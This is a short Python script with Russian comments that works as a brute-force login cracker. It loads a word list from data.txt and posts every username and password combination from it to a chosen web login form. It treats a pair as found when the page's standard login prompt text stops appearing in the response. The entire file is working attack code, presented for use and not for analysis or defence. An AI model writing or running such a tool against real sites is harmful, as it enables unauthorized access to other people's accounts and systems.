import requests
import re

#url страницы для подбора
get_url = None
passwords_file = "data.txt"
lg_massive = []

def brute_url(urlme):
    global get_url
    get_url = urlme

def validation_page():
    try:
        print_get = requests.get(get_url)
    except:
        print("страница не найдена")

#пробуем открыть файл data.txt, заносим построчно в массив lg_massive
def generate_login(url_file):
    try:
        lg_file = open(url_file, "r")
        for word in lg_file:
            lg_massive.append(word.strip())
    except:
        print("файл data.txt - не найден")

#функция отправки post запроса, с нашими данными
def post_data():
        numbers = range(0, len(lg_massive)*len(lg_massive))
        i = 0
        #перебираем значение из массива используем в post запросе дял передачи в input [login]
        for word in lg_massive:
            #перебираем значение из массива используем в post запросе, для передачи в input [password]
            for word2 in lg_massive:
                i = i + 1
                #ищет известное нам значение
                h_text = "Please fill in your credentials to login"
                data = {"username":word,"password":word2}
                accept_post = requests.post(get_url, data)
                s = re.search(h_text, accept_post.text)
                #если h_text - больше не найдено в структуре документа, значит пара найдена (в этом моменте можно получить ложные результаты readme.txt)
                if s == None:
                    print("\033[1m"+"\033[91m" + "[" + str(numbers[i]) +"]*@#!"+"пара подобрана: ", word +" " + word2 + "\033[0m")
                    return True
                elif s != None:
                    print("[" + str(numbers[i]) +"]*@#!"+"пробуем подобрать: " + word +" " + word2)
                #если значение h_text не совпадает, продолжаем перебор
                else :
                    print("wtf?")
